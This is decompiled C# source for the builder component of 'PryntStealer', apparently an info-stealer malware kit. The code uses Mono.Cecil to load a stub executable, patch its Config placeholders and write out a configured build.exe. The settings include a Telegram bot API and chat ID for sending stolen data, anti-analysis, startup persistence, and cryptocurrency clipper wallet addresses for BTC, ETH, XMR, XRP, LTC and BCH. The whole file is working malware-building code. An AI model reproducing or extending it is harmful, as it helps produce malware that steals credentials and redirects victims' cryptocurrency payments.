using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using Mono.Cecil;
using Mono.Cecil.Cil;

namespace PryntStealer
{
	// Token: 0x0200000C RID: 12
	internal sealed class build
	{
		// Token: 0x06000044 RID: 68 RVA: 0x00006255 File Offset: 0x00004455
		private static string RandomString(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length)
			select s[build.random.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00006290 File Offset: 0x00004490
		private static AssemblyDefinition ReadStub()
		{
			return AssemblyDefinition.ReadAssembly("stub\\stub.exe");
		}

		// Token: 0x06000046 RID: 70 RVA: 0x0000629C File Offset: 0x0000449C
		private static void WriteStub(AssemblyDefinition definition, string filename)
		{
			try
			{
				definition.Write(filename);
			}
			catch (Exception ex)
			{
				string str = "Error Building Stub ";
				Exception ex2 = ex;
				MessageBox.Show(str + ((ex2 != null) ? ex2.ToString() : null));
			}
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000062E4 File Offset: 0x000044E4
		private static string ReplaceConfigParams(string value)
		{
			foreach (KeyValuePair<string, string> keyValuePair in build.ConfigValues)
			{
				if (value.Equals("--- " + keyValuePair.Key + " ---"))
				{
					return keyValuePair.Value;
				}
			}
			return value;
		}

		// Token: 0x06000048 RID: 72 RVA: 0x0000635C File Offset: 0x0000455C
		public static AssemblyDefinition IterValues(AssemblyDefinition definition)
		{
			foreach (ModuleDefinition moduleDefinition in definition.Modules)
			{
				foreach (TypeDefinition typeDefinition in moduleDefinition.Types)
				{
					if (typeDefinition.Name.Equals("Config"))
					{
						foreach (MethodDefinition methodDefinition in typeDefinition.Methods)
						{
							if (methodDefinition.IsConstructor && methodDefinition.HasBody)
							{
								foreach (Instruction instruction in methodDefinition.Body.Instructions)
								{
									if (instruction.OpCode.Code == Code.Ldstr & instruction.Operand != null)
									{
										string text = instruction.Operand.ToString();
										if (text.StartsWith("---") && text.EndsWith("---"))
										{
											instruction.Operand = build.ReplaceConfigParams(text);
										}
									}
								}
							}
						}
					}
				}
			}
			return definition;
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00006508 File Offset: 0x00004708
		public static string BuildStub()
		{
			build.WriteStub(build.IterValues(build.ReadStub()), "stub\\build.exe");
			return "stub\\build.exe";
		}

		// Token: 0x0400002D RID: 45
		private static Random random = new Random();

		// Token: 0x0400002E RID: 46
		public static Dictionary<string, string> ConfigValues = new Dictionary<string, string>
		{
			{
				"Telegram API",
				""
			},
			{
				"Telegram ID",
				""
			},
			{
				"AntiAnalysis",
				""
			},
			{
				"Startup",
				""
			},
			{
				"StartDelay",
				""
			},
			{
				"ClipperBTC",
				""
			},
			{
				"ClipperETH",
				""
			},
			{
				"ClipperXMR",
				""
			},
			{
				"ClipperXRP",
				""
			},
			{
				"ClipperLTC",
				""
			},
			{
				"ClipperBCH",
				""
			},
			{
				"Clipper",
				""
			},
			{
				"Mutex",
				build.RandomString(20)
			}
		};
	}
}
